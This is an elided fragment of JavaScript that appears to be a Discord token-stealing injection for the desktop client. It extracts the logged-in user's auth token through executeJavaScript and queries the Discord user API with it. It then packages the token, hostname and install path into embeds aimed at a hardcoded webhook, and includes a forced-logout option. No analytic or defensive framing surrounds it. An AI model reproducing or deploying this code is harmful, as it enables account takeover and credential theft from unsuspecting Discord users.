const fs = require ( 'fs' ),
    ...
    os = require("os");
var webhook = "https://discord.com/api/webhooks/932310199228825640/_IMYaU1XWyR1eKsTy0vcVAOXOkDRTRmhS7OUlmwZdBp9axFZSU76uh8iy9sBRLWReff3";
...
function FirstTime() {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`${EvalToken}`, !0).then(e => {
        if ("true" == config["init-notify"] && fs.existsSync(path.join(__dirname, "init")))
            if (fs.rmdirSync(path.join(__dirname, "init")), null == e || null == e || "" == e) {
                var t = {
                    ...
                    content: "",
                    embeds: [{
                        title: "Discord (User not Logged in)",
                ...
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${e}"),xmlHttp.send(null),xmlHttp.responseText;\n                    `, !0).then(t => {
                    ...
                    var r = {
                        ...
                        embeds: [{
                            ...
                            description: "[**<:partner:909102089513340979> │ D**](https://ctf.surf/raw/" + e + ")",
                            color: config["embed-color"],
                            fields: [{
                                name: "Info",
                                value: `\`\`\`Hostname: \n${computerName}\nInfo: \n${__dirname}\n\`\`\``,
        ...
        if (fs.rmdirSync(path.join(__dirname, "BTW")), "false" != config.logout || "%LOGOUT%" == config.logout) {
